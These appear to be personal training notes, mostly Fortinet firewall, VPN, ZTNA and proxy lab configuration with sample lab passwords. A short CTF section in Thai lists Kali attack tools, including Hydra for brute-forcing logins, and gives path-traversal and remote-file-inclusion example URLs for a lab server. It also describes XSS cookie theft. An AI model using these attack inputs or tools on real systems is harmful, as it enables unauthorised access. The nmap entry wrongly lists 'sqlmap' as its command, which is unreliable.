		- VPN Events
		- SD-Wan Events
		- User Events
		- Endpoint Events
More: **Simplify SOC with Security Fabric Analytics and Automation**
##### Security Profiles
###### FortiGuard web filtering
FortiGuard web filtering leverages industry-leading threat intelligence from FortiGuard Labs. FortiGuard Labs blocks 66 million malicious/phishing/spam URLs through approximately 307 million categorized URLs. The service utilizes a database of hundreds of millions of URLs classified into 90+ categories to empower granular web controls and reporting. It also supports 
encrypted traffic (including TLS 1.3) to enable compliance and acceptable usage.

- **Security Profiles** > **Web Filter**
	- **Feature set** as **Flow-based**
	- **FortiGuard Category Based Filter**, locate **General Interest - Personal**
		- **Social Networking** and click **Block**
- **Policy & Object** > **Firewall** **Policy**
	- **Security Profiles**, turn on **Web Filter**
	- **SSL inspection** to **deep-inspection**

You can use the FortiGuard URL lookup service to check which website belongs to which category. To do this, browse the www.fortiguard.com, click Threat Intelligence, and then click Web Filtering. The screenshot below shows the results for the website, www.fortinet.com.
###### Application control
- **Security Profiles** > **Application Control**
	- **Application and Filter Overrides**, click **Create New**
- **Policy & Object** > **Firewall** **Policy**
	- **Security Profiles**, turn on **Application Control**
	- **SSL inspection** to **deep-inspection**
-  **Log & Report** > **Security Event**
###### FortiGuard IPS service

FortiTester is a network security testing tool designed to identify and evaluate network security devices and applications. It is an easy-to-use tool that allows security teams to assess the effectiveness of their network security solutions before deploying them in production environments. With FortiTester, organizations can ensure that their security infrastructure is capable of defending against advanced threats and is optimized for maximum performance.    

The AI/ML-powered FortiGuard IPS service provides near real-time intelligence with thousands of intrusion prevention rules to detect and block known and suspicious threats before they ever reach your devices. Natively integrated across the Fortinet Security Fabric, the FortiGuard IPS service delivers industry-leading IPS performance and efficiency while creating a coordinated network response across your broader Fortinet infrastructure.

- **Security Profiles** > **Intrusion Prevention**
- **Policy & Object** > **Firewall Policy**
	- **Security Profiles**, turn on **IPS** > **default**
	- **SSL inspection** to **deep-inspection**
FortiTester VM > Security
- **Objects** > **FGD Intrusion Group**
- **IPS** > Start
**Log & Report** > **Security Events**
- **Intrusion Prevention**
###### FortiGuard AI-based inline malware prevention service

FortiGate
- **Security Fabric** > **Fabric Connectors**.
- **FortiSandbox**
	- **Status** to **Enabled**
	- **Server** to`192.168.0.122`
	- Turn on **Inline Scan** and click **OK**
- **Security Profiles > AntiVirus**
	- **default**
		- **Feature set**, turn on **Proxy-based**
		- **APT Protection Options**, 
			- turn on **Send files to FortiSandbox for inspection**, 
				- set **Scan strategy** to **Inline**
				- set **Action** to **Block**
		- Turn on **Use FortiSandbox database**.
- **Policy & Objects > Firewall Policy** : _To_Internet
	- **Security Profile**, turn on **AntiVirus**
	- **SSL inspection** to **deep-inspection**
FortiSandbox
- **Security Fabric** > **Device**
- **Permissions and Policy**, verify that the **Authorized** box is checked. 
- Verify the **Inline Block Policy** is turned on
- **Malicious** and **HIGH RISK** are selected under **Files with selected Risk will be blocked**.

More: _**Breaking the Kill Chain with AI-Driven Breach Protection**_
###### IOC and automation stiches
automated workflows, called an automation stitch, which use if/then statements to cause FortiOS to automatically respond to an event in a pre-defined fashion. Each stitch defines an action to take when a trigger event is detected. Because this workflow is part of the Security Fabric, automation stitches are configured in the Security Fabric root FortiGate and replicated to all downstream FortiGate devices.

FortiGate
- **Security Fabric** > **Automation**
	- Automation Stitch
		- - **Name:** `Compromised Host`  
		- **Status:** **Enable**  
		- **FortiGate:** **All FortiGates**
		- Add Trigger > Create > **FortiAnalyzer Event Handler**
			- Compromised Host
		- Add Action > IP Ban
- **Dashboard** > **Assets & Identities**
##### Fortifying the Enterprise Network
###### Internal segmentation
FortiSwitch can control communication between programmable logic controllers (PLCs) connected on the same L2 network.

FortiSwitch VLAN
- **WiFi & Switch Controller** > **FortiSwitch VLANs**.  
	- **Create New**.  
	- Set **Name** to `PLC-Network`.  
	- Set **VLAN ID** to `30`.  
	- Set **IP/Netmask** to `172.16.30.254/24`. 
	- Under **Network**, turn on **Block intra-VLAN traffic**.
- **WiFi & Switch Controller** > **FortiSwitch Ports**.
1. Edit the **Native VLAN** of **port2
2. Set it to **PLC-Network** and **Apply**. 
3. Edit **port3 Native VLAN**, set it to **PLC-Network**, and **Apply**.
Set allow-traffic-redirect  
    `config system global`  
    `set allow-traffic-redirect disable`  
    `end`

**_Cybersecurity for Safe, Reliable, Secure Industrial Control Systems (ICS)_**
###### Zero trust network access (ZTNA)
ZTNA operates on the foundational principle of "never trust, always verify. " It significantly reduces organizational attack surfaces by meticulously verifying user and device credentials before granting access to applications. Furthermore, it continuously monitors these entities for any alterations in their security posture.

ZTNA provides the following key features

- Verify user and device identity, possibly using multi-factor authentication (MFA) and certificates, to ensure that only the correct users and devices have access.
- Checks the contextual information about the user, such as their location, time of day, and device type, to ensure that it matches the policy for accessing an application.
- Verify the device's posture to ensure that only appropriately configured devices can access applications.
- Provide ongoing checking of users and devices so that if any contextual information changes, access to the application is removed.
- Only grant access to a specific application for a single session. Every access request is verified, regardless of the user or application.
- Reduce the attack surface, making it harder for bad actors to gain or maintain access to an application.

The FortiGate HTTPS access proxy functions as a reverse proxy for the HTTP server. When a client attempts to connect to a web page hosted by the protected server, the address resolves to the access proxy VIP. The FortiGate then intermediates the connection, initiating user authentication procedures. It prompts the user to provide their certificate via the browser and verifies it against the ZTNA endpoint record, which is synchronized from FortiClient EMS. If an authentication scheme, such as SAML authentication, is enabled, the client is redirected to a captive portal for sign-on. Upon successful authentication, traffic is permitted based on the ZTNA rules, and the FortiGate device delivers the requested web page to the client.

Fortigate
- **Policy & Objects** > **ZTNA** > **ZTNA Server**
	- **ZTNA_webserver**
- **Policy & Objects** > **Firewall Policy**
	- **ZTNA_Server**

**The Evolution of Access to Applications with Fortinet ZTNA**
###### SSO firewall authentication
FortiAuthenticator SSO methods using Windows event log polling

FortiAuthenticator
- **System** > **Network** > **Interfaces**
	- **port2**
		- **FortiGate FSSO (TCP/8000)**, **LDAP(TCP/389)** is enabled.
- **Fortinet SSO** > **Settings** > **FortiGate**
	- set up FortiGate SSO configuration
	- **Methods**
- **Fortinet SSO** > **Methods**> **Windows Event Log**
- **Monitor** > **SSO** > **Windows Event Log Sources**
- **Fortinet SSO** > **Filtering** > **FortiGate**
SSO FortiGate
- **Security Fabric** > **External Connector**
	- **Create New**
	- **FSSO Agent on Windows AD**
		- **Name** to `FAC`.
		- Set **Primary FSSO agent** to `172.16.100.129` - `Fortinet1!`.
**Domain** **Controller**
- User & Authentication
- **Add widget**
- Turn on **Show all FSSO Logons**
###### ADVPN
Auto Discovery VPN (ADVPN) is an IPsec technology that allows traditional hub-and-spoke VPN spokes to establish dynamic, on-demand, direct tunnels between each other to avoid routing through the topology's hub device.

The primary advantage is that it provides full meshing capabilities to a standard hub-and-spoke topology. This greatly reduces the provisioning effort for full spoke-to-spoke low delay reachability and addresses the scalability issues associated with very large fully meshed VPN networks.

If a customer's head office and branch offices all have two or more internet connections, they can build a dual-hub ADVPN network. Combined with SD-WAN technology, the customer can load-balance traffic to other offices on multiple dynamic tunnels, control specific traffic using specific connections, or choose better-performance connections dynamically.

**Configure BGP**
ADVPN requires an internal routing protocol to establish peer connections and route traffic between the two spokes without affecting routing for any other spoke. FortiGate ADVPN supports BGP, OSPF, and RIP as the routing protocol. In this lab, you will use BGP as the routing protocol across the hub and spoke topology.  
  
Before building the VPN topology, a few BGP settings must be configured. In particular, you will need to assign a Local AS and Router ID for the hub and each spoke. To simplify expanding this topology to many more sites, you will also use a Neighbor Group at the hub, rather than statically defining each spoke neighbor.

**Configure BGP Settings on FGT-EDGE**

Fortigate
- **Network** > **BGP**
	- In the **Local AS** field, type `65400`
	- In the **Router ID** field, type `0.0.0.101`
	- **Neighbor Groups**
		- **Name:** `Branch-Peers`  
		- **Remote AS:** `65400`      
		- **Route reflector client:** Enabled

**Configure BGP Settings on FGT-BR1**
 FGT-BR1
- **Network** > **BGP**
	- In the **Local AS** field, type `65400`.  
	- In the **Router ID** field, type `0.0.0.111`.

**Configure BGP Settings on FGT-BR2**
 FGT-BR2
- **Network** > **BGP**
	- In the **Local AS** field, type `65400`.  
	- In the **Router ID** field, type `0.0.0.112`.

**Build IPsec Hub & Spoke VPN**
The IPsec VPN wizard includes the necessary components to utilize ADVPN when choosing the Hub-and-Spoke template type by default.

**Configure VPN on FGT-EDGE with the IPsec Wizard**

**Fortigate**
- **VPN** > **VPN Wizard**
	- **VPN Setup**
	- **Name:** `Branches`  
	- **Template type:** **Hub-and-Spoke**
	- **Begin**
	- **Type** to **Hub**.
	- **Next**
	- **Local** **Site**
		- - **Incoming Interface that binds to tunnel: ISP1 (port6)**  
		- **Tunnel IP:** `10.10.1.101`  
		- **Local Interface: port2,port3,port4**  
		- **Local subnets that can access VPN:**  Click the **+** button to add more subnets:  
		    - `172.16.10.0/24`
		    - `172.16.20.0/24   `
		    - `172.16.100.0/24` 
		- **Local AS:** `65400`
	- **Next** > **Submit**
	- **Easy configuration key**
- **Hub & spoke topology**
	- **BGP neighbor range**
	- **Generate easy config key**
		- **Spoke IP:** `10.10.1.111`
		- **Spoke IP:** `10.10.1.112`
	- **Generate Easy Configuration Key**

**Configure VPN on FGT-BR1 and FGT-BR2 with the IPsec Wizard**

**FGT-BR1**
- **VPN** > **VPN Wizard**
- Set **Tunnel name** to `Hub`.
- Select **Hub and Spoke with ADVPN**
- Click **Begin**
- Set **Role** to **Spoke**
- Paste the FGT-BR1 key into **Easy configuration key** and click **Next**
- Under **Local site**, enter the following settings
	- **Outgoing Interface that binds to tunnel:** **ISP1 Branch 1 (port2)**
	- **Tunnel IP:** `10.10.1.111`
	- **Local Interface: Branch1 (port4)**
	- **Local subnets that can access VPN:** `172.20.1.0/24`
	- **Local AS** `65400`
	- **Next** and set **Pre-shared** **key** to `Fortinet1`
	- Under **Hub**, verify the following settings
		- **Remote IP/network:** `10.10.1.101/24`
		- **Hub public IP address:** `100.65.0.101`
	- **Next** and **Submit**
	- Under **Tunnel** **Settings**, expand **Network**, and then expand **Advanced network settings**
		- **Add route** to **Disable**

**FGT-BR2**
- **VPN** > **VPN Wizard**
- Set **Tunnel name** to `Hub`.
- Select **Hub and Spoke with ADVPN**
- Click **Begin**
- Set **Role** to **Spoke**
- Paste the FGT-BR1 key into **Easy configuration key** and click **Next**
- Under **Local site**, enter the following settings
	- **Outgoing Interface that binds to tunnel:** **ISP1 Branch 2 (port2)**
	- **Tunnel IP:** `10.10.1.112`
	- **Local Interface: Branch2 (port4)**
	- **Local subnets that can access VPN:** `172.20.2.0/24`
	- **Local AS** `65400`
	- **Next** and set **Pre-shared** **key** to `Fortinet1`
	- Under **Hub**, verify the following settings
		- **Remote IP/network:** `10.10.1.101/24`
		- **Hub public IP address:** `100.65.0.101`
	- **Next** and **Submit**
	- Under **Tunnel** **Settings**, expand **Network**, and then expand **Advanced network settings**
		- **Add route** to **Disable**

**## Explore, Build & Flush Shortcut Tunnel**
In a traditional hub-and-spoke VPN topology, all traffic from one spoke to another travels entirely through the hub. In an ADVPN configuration, the first packet is sent through the hub, at which point the hub coordinates with each spoke to build the shortcut tunnel and update the dynamic routing table for each spoke, allowing them to communicate directly.

**Explore the BGP and VPN Configurations**

**Fortigate**
- **Dashboard** > **Network**.
	- **IPsec** to view all tunnels
	- **Routing**

**Prepare a Sniffer to Watch the ADVPN Shortcut Tunnel Being Built**

On **FGT-EDGE**, **FGT-BR1** and **FGT-BR2**
```sh
diagnose sniffer packet any 'host 172.20.1.254 and host 172.20.2.53 and icmp' 4
```

**Initiate Traffic to Trigger the ADVPN Shortcut Tunnel Creation**

**David**
```sh
ping 172.20.1.254 -n 8
```

**View and Flush the ADVPN Shortcut Tunnels from the CLI**

**FGT-BR1**
```sh
diagnose vpn tunnel list
diagnose vpn ike gateway list
diagnose vpn ike gateway flush name Hub_0
```

More: **Constructing a Secure SD-WAN Architecture**
###### Creating FortiGate DPI certificates using FortiAuthenticator
When you use deep inspection, FortiGate impersonates the recipient of the originating SSL session, then decrypts and inspects the content to find threats and block them. It then re-encrypts the content with a certificate signed by the FortiGate and sends it to the real recipient. The FortiGate acts as a subordinate CA to sign the certificate on the fly, as it re-encrypts traffic. The FortiGate usually uses a subordinate CA certificate, AcmeCorp is going to use FortiAuthenticator private CA to sign the subrodinate CA certificate that FortiGate is going to use for DPI.

**FortiAuthenticator**
- **Certificate Management** > **Certificate Authorities** > **Local CAs**
	- **Create New**
		- **Certificate ID** to: `AcmeCorp_DPI`
		- Set **Certificate type** to **Intermediate CA**
		- Set **Name (CN)** to: `inspection.acmecorp.net`
		- **Save**
	- Select **AcmeCorp_DPI**, and then click **Export Key and Cert**.
		- Set **Passphrase** and `Fortinet1!`, confirm that passphrase, and then click **Save**.
		- Click **Download PKCS#12 file**, and then click **Finish**

**Fortigate**
- **System** > **Certificates**
	- **Create/Import**, then click **Certificate**
	- **Import Certificate**
	- Set **Type** to **PKCS#12 Certificate**.
	- Click **Upload File** and upload the previously downloaded **AcmeCorp_DPI** certificate
	- Set **Password** and **Confirm Password** to `Fortinet1!`.
	- Click **Create**, and then click **OK**.
- **Security Profiles** > **SSL/SSH Inspection**.
	- **Create New**
		- **Name:** `AcmeCorp_DPI`
		- **CA certificate**: **AcmeCorp_DPI**
- **Privacy and security** > **Security**
	- Click **Manage certificates**, and click **Managed imported certificates from Windows**
	- Click **Trusted Root Certification Authorities** > **Import**.
	- Click **Browse** and upload the **AcmeCorp_DPI** certificate, located in the download folder
	- Make sure **Place all certificates in the following store** is set to **Trusted Root Certification Authorities**.
	- Click the **Connection is secure icon,** and then click **Certificate is Valid**.
- You will notice that, under **Issued By**, the **Common Name** **(CN)** is **inspection.acmecorp.net**, which is the deep inspection certificate. 
- This means FortiGate is intercepting the connection and performing DPI.

**Setting Up a Firewall Policy to use DPI**
- **Policy & Objects** > **Firewall Policy**
- **Edit** the **Sales_Finance_To_Internet** policy
- Set **SSL Inspection** to **AcmeCorp_DPI**
- If none of the security profiles are enabled, turn on web filter and select the **default** profile
###### Central management using FortiManager
Modern network security technologies are designed to keep your business safe from cyberthreats, but are often complex to manage and monitor. AcmeCorp is deploying FortiManager to centralize secure network management of the Fortinet Security Fabric and ensure consistent security policies across the infrastructure.

FortiManager, now powered by FortiAI, revolutionizes network management and security operations by automating routine tasks and providing intelligent insights. Key FortiManager benefits include accelerated zero-touch provisioning with best-practice templates for SD-WAN deployment and streamlined workflows between the Fortinet Security Fabric and NOC/SOC solutions with 500+ ecosystem partners.

**Deploy FGT-Branches Policy using FortiManager**

**FortiManager**
- **Policy & Object** > **Normalized Interface**.
	- **Per-Device Mapping**, then click **Create** **New**.
		- Set **Mapped Device** to **FGT-BR1** and **Mapped Interface Name** to **port2**
	- **Per-Device Mapping**, click **Create New**
		- Set **Mapped Device** to **FGT-BR2** and **Mapped Interface Name** to **port2**.
	- Under **Normalized** Interfaces, search for `Branches_LAN` and double-click **Branches_LAN** to edit it.
	- Click **Per-Device Mapping**, and then click **Create** **New**.
		- Set **Mapped Device** to **FGT-BR1** and **Mapped Interface Name** to **port4**
	- Under **Per-Device Mapping**, click **Create New**.
		- Set **Mapped Device** to **FGT-BR2** and **Mapped Interface Name** to **port4**.
- **Policy & Objects** > **Policy Packages**
	- Click **Installation** **Targets**. Under **Branches**, both **FGT-BR1** & **FGT-BR2** are shown.
	- Click **Firewall Policy,** then click **Create New,** and then click **Create New**.
		- **ID:** `2`
		- **Name:** `LAN_To_Internet`
		- **Action:** **Accept** 
		- **Incoming Interface:** **Branches_LAN**
		- **Outgoing Interface:** **ISP_1**
		- Enable **NAT**
	- Click **Install Wizard,** then click **Next**, and click **Next**

**View the Branch Policies**

**FGT-BR1**
- **Policy & Object** > **Firewall Policy**
- You will notice that the policy **LAN_To_Internet** has been pushed to FGT-BR2.

**FGT-BR2**
- **Policy & Object** > **Firewall Policy**
- You will notice that the policy **LAN_To_Internet** has been pushed to FGT-BR2.

More: **Reduce the Complexity of Operations with the Fabric Management Center**
###### Policy-based inspection

The Fortinet FortiGate NGFW has two inspection modes: profile-based and policy-based.  
  
Policy-based NGFW mode allows administrators to add applications and web filter categories directly to a firewall policy without first creating and configuring an application control or web filter profile. When policy-based NGFW mode is enabled, the FortiGate will automatically be configured to use central NAT and Flow-based inspection security profiles. These two modes combine to make administrating a FortiGate simple and easy while providing high performance.

**Verify NGFW Mode**

NGFW Mode is a per VDOM setting. This means administrators can operate individual VDOMs on a FortiGate device in either policy-based or profile-based mode. If the VDOM feature is not enabled, the entire FortiGate is set to the mode selected.

**Fortigate**
- **System** > **Settings** 
	- verify that **NGFW Mode** is set to **Policy-based**
- **Security Profiles** > **SSL/SSH Inspection**
	- Edit the **custom-deep-inspection** profile
	- Verify protocols **HTTPS**, **SMTPS**, **POP3S**, and **IMAPS** are enabled

**Configure NGFW Policy to Block Applications**
In policy-based mode, you can add applications and web filtering categories directly to a policy without having to first create and configure an application control or web filter profile.

**Fortigate**
- **Policy & Objects** > **Security Policy**.
	- **Create New**
		- **Name:** `Blocked Applications`  
		- **Action:** **Deny**  
		- **Incoming Interface:** **EDGE_ISFW Network (port4)**  
		- **Outgoing Interface:** **Internet**  
		- **Source:** **all**  
		- **Destination:** **all**  
		- **Service:** **App Default**  
		- **Application:** **Twitter** and **YouTube**
		- **URL Category:** _Leave blank_
	- Click the dotted lines next to the policy and drag **Blocked_Applications** to the top of the policy list.
##### Secure Web Gateway

FortiProxy is a high-performance, secure web gateway that safeguards employees from online threats through advanced filtering and inspection.
- Policies in FortiProxy have multiple types, including explicit and transparent.
- The explicit web proxy also supports proxying FTP sessions from a web browser.
- Proxy profiles can be used to add, remove, and change HTTP headers.

FortiProxy
- **Network** > **Interfaces**.
	- **port2**
	- Enable **Explicit web proxy** under **Miscellaneous**
- **Proxy Settings** > **Web Proxy Profile**
	- **Create New**.
	- name `XFF` 
		- The name for the profile is case-sensitive
		- Make sure to use all uppercase letters.
	- Under **Header Type**, set the **Action** for **Header x Forwarded For** to **Add**.
		- This will add a header to HTTP traffic identifying the originating IP address of a client connecting to a web server.
	- **OK**
- **Proxy Settings** > **Explicit Proxy**
	- **Edit** the existing profile **web-proxy**.
	- Set **Interfaces** to **port2** and **HTTP Incoming IP** to **172.16.99.153 - port2**. 
	- Leave the rest of the settings as the default.
	- **OK**
- **Policy & Objects** > **Policy**
	- **Create New**
		- **Type**: **Explicit Web**
		- **Name**: `ExplicitProxy   `
		- **Explicit Web Proxy**: **web-proxy**
		- **Outgoing Interface**: **port2**
		- **Source**: **all**
		- **Destination**: **all**
		- **Service**: **webproxy**
		- **Action**: **ACCEPT**
	- Under **Proxy options**, enable **Webproxy Profile** and set it to **XFF**
	- Under **Security Profile**, enable **Web Filter** and set it to **monitor-all**. Also, set **SSL/SSH inspection** to **custom-deep-inspection**.
	- Under **Logging Options**, set **Log Allowed Traffic to All Sessions** and toggle on **Log HTTP Transaction**.
	- **OK**

**Browser Configuration and Testing**

In explicit proxy mode, the user's browser network settings must be explicitly configured to forward HTTP/HTTPS traffic to the FortiProxy interface you configured earlier. The browser can be configured manually to point to the FortiProxy interface or automatically by downloading a PAC file from the FortiProxy to provide automatic configurations for explicit proxy web users. The explicit web proxy uses FortiProxy routing to route sessions through the FortiProxy to a destination interface. Before a session leaves the exiting interface, the explicit web proxy changes the source address of the session to the IP address of the exiting interface. You can configure the explicit web proxy to keep the original client IP address.

Configuring Browser for Explicit Proxy
- **Settings**
- **Network Settings**
- **Manual proxy configuration**
	- **HTTP Proxy**: `172.16.99.153`
	- **Port**: `8080`
	- **Also use this proxy for HTTPS**
	- **OK**

**Forward Logs, HTTP Logs**
The forward traffic log includes messages for traffic that pass through the FortiProxy. It provides traffic and security log messages, allowing you to view security events alongside messages about the traffic at the time of the event.

FortiProxy
- **Log & Report** > **Forward Traffic**
	- **Note:** Switch the log to **All time** if now traffic logs are visible.
- **Add Filter**
- **HTTP Transaction Log**
	- **Hostname**, **Scheme**, **Response Type**, and **Duration**
###### Web Access Authentication

**LDAP and User Group Setup**
Lightweight Directory Access Protocol (LDAP) is an IP protocol used to maintain authentication data that can include departments, people, groups of people, passwords, email addresses, and printers. LDAP comprises a data representation scheme, defined operations, and a request/response network. FortiProxy will use LDAP to authenticate users from a domain controller.

**FortiProxy**
- `execute ping 172.16.100.10` and hit `Enter`.
- **User & Authentication** > **LDAP Servers**
	- **Test Connectivity**
	- **Test User Credential**
		- **Username**: `alice` 
		- **Password**: `Fortinet1!`
		- **Test**
- **User & Authentication** > **User Groups**
	- **Name**: `Sales`
	- **Type**: **Firewall**
	- Under Remote Groups, click **Add** and set **Remote Server** to **LDAP**.
	- In the **Search,** type `Sales` and press `Enter`. Click the entry for **Sales**, then click **Add All Results.**
	- **OK**

**Setting Up Authentication Rules**

Authentication rules determine how FortiProxy receives user identity based on the protocol and source address values. After a rule is positively matched through the protocol and/or source address, the authentication is checked using with active-auth-method and sso-auth-method. These methods point to schemes as defined under the config authentication scheme.

When you combine authentication rules and schemes, you have granular control over users and IP addresses, creating an efficient process for users to match criteria before matching the policy. To enforce authentication, you must still add a user group to the explicit proxy policy on top of the authentication rule configuration.

**FortiProxy**
- **Policy & Objects** > **Authentication Rules**
- **Create New** > **Authentication Schemes.**
	- **Name**: `HTTP-Basic`
	- **Method**: **Basic**
	- **User database**: **LDAP**
- **Create New** > **Authentication Rule**
	- **Name**: `Basic-Authentication`
	- **Protocol:** **HTTP**
	- **Source Interface**: **port2**
	- **Source Address:** **all**
	- **Destination Address**: **all**
	- Enable the **Authentication Scheme** and set it to **HTTP-Basic.  
- **Authentication Rules**
- **Policy & Objects** > **Policy**
	- Edit the **ExplicitProxy** policy
	- **Source** > **User** > **Sales**
- **Dashboard**
	- **FortiView Policies** added by by clicking the **+**
- **Dashboard** > **User Monitor**
	- **Firewall Users**
	- **Add Monitor**

**Content Analysis**

A content analysis security profile on FortiProxy, which will be used to block extremism and weapons content images

**FortiProxy**
- **Content Analyses > Image Analysis**
	- Edit **Extremism & Weapons Content**
		- **Rating Error Action**: **Block**
		- Under **Block Strictness Level**:
			- **Extremism: 100**
			- **Weapons**: **100**
		- Enable **Optical Character Recognition**
- **Policy & Objects** > **Policy**
	- **Explicit-Web**
	- **Security Profile**
	- enable **Content Analysis**
	- select **Extremism & Weapons Content**
	- **SSL/SSH Inspection** is set to **custom-deep-inspection**.
- **Log & Report > Content Analysis**
##### Conclusion
Now that you've completed the **Optimizing Modern Network Security Strategies with NGFW** workshop, here are a few additional resources and next steps.

For continued learning about the FortiGate NGFW products utilized in this workshop, please consider looking at the following NSE training courses:

- [FCA Cybersecurity](https://training.fortinet.com/course/index.php/Certification:FCA_Cybersecurity) certification including the following courses:
    - [FortiGate Operator](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-operator)
- [FCP Network Security](https://training.fortinet.com/course/index.php/Certification:FCP_Network_Security) certification including the following courses:  
    - [FortiGate Administrator](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-administrator)
    - [FortiGate Security](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-security)
    - [FortiGate Infrastructure](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-infrastructure)
- [FCP Security Operations](https://training.fortinet.com/course/index.php/Certification:FCP_Security_Operations) certification including the following courses:
    - [FortiGate Administrator](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-administrator)
    - [FortiGate Security](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-security)
    - [FortiGate Infrastructure](https://training.fortinet.com/local/staticpage/view.php?page=library_fortigate-infrastructure)

Additional resources and tools can be found at the following locations:

- [Docs - FortiGate / FortiOS](https://docs.fortinet.com/product/fortigate/7.4)
- Docs - 4D Resources <Solution Area>

Ask your instructor for more information about the following [Fast Track workshops](https://training.fortinet.com/local/staticpage/view.php?page=fast-track-workshop-abstracts):

- Securing the Hybrid Workforce with SASE
- Constructing a Secure SD-WAN Architecture
- SD-Branch: LAN Edge Wired and Wireless
- Creating a Comprehensive Fortinet Security Fabric
- Breaking the Kill Chain with AI-Driven Breach Protection 
- Performance and Security Testing 
- Simplify SOC with Security Fabric Analytics and Automation 
- Reduce the Complexity of Operations with the Fabric Management Center 
- The Evolution of Access to Applications with Fortinet ZTNA

## Capture The Flag (CTF)
#### Introduction to Natural Language Processing

Natural Language Processing (NLP) applied computational techniques to analyze and generate human languages
- Tokenization
- Part-of-Speech Tagging
- Text Classification
- Sentiment Analysis
- Named Entity Recognition
- Language Generation
- Machine Translation
- Word Embedding
[Colab](https://colab.research.google.com/drive/1YkJpkXncCIWGWAbLXO7ZHBNwI0r15PuA?usp=sharin)
- tokenize
- stopwords in Thai
- sentiment analysis
[Exercise](https://colab.research.google.com/drive/1EPhqcZEyENf3C_LRSPy0tuJgntfJM4Ds?usp=sharing)
### Kali Linux
- [VMWare Fusion](https://drive.google.com/file/d/11GYWsR2SIMGdGWCFkc8Wu0YICyPsKjnA/view?usp=drivesdk)
- [Installer](https://drive.google.com/drive/folders/145Njq7njUdLSttpGs4K7JJ-PabrDO7uw)
#### Tools
- [Burp Suite](https://portswigger.net/burp/communitydownload)
	`burpsuite`
- sqlmap
	`sqlmap`
- nmap (Network Map)
	`sqlmap`
- zenmap
- Hydra เอาไว้ brute force ระบบ ssh, ftp และ web ได้
	`hydra`
- Metasploit 
	`msfconsole`
- John the ripper
	`john`
#### ระบบการจัดการไฟล์

File Permission ประกอบไปด้วยค่า 10 ตำแหน่ง เรียงจากซ้ายไปขวา ประกอบด้วย
- หลักแรก เป็นประเภทของไฟล์ โดย `d` แทน directory `-` แทน file ทั่วไป และ `l` แทน lint
- ถัดไป จะประกอบไปด้วย ตัวอักษร 3 หลัก 3 ชุด 
	- แสดง permission ของ user, group และ other ตามลำดับ 
	- แต่ละชุด จะประกอบไปด้วยสิทธิค่าของ read, write, execute 
	- แสดงเป็นตัวอักษร r, w, x หรือ `-` กรณีไม่มีสิทธิ

File Path สำหรับแสดงผลของ Web Server (default)
- Linux Apache จะอยู่ที่ `/var/www/html`
- Windows IIS จะอยู่ที่ `C:/inetpub/wwwroot`
[เพิ่มเติม](https://www.linuxfoundation.org/blog/blog/classic-sysadmin-the-linux-filesystem-explained)
#### Lab
##### Path Traversal & Local File Inclusion
เข้าถึงไฟล์ที่ path อื่นใน server ได้ เช่น
`192.168.10.7:6002/note.php?url=http://10.3.10.22/info.php`
##### Remote File Inclusion
เรียกไฟล์ที่ url path อื่น แล้วให้ไฟล์ใน server อื่นเข้ามาอ่านไฟล์ใน server หลัก
`http://192.168.10.7:6002/note.php?url=http://192.168.10.55/info.php`
##### Command Injection

##### Cross-site Scripting
สามารถรันคำสั่ง script จาก input ในฟอร์มบนเวบได้
สามารถนำไปใช้รันคำสั่งดึง Cookie เพื่อนำไปส่งให้ผู้ไม่ประสงค์ดีได้
[เพิ่มเติม](https://www.invicti.com/learn/cross-site-scripting-xss/)
##### SQL Injection using sqlmap
##### Unrestricted File Upload, Command Injection, webshell


## Hackathon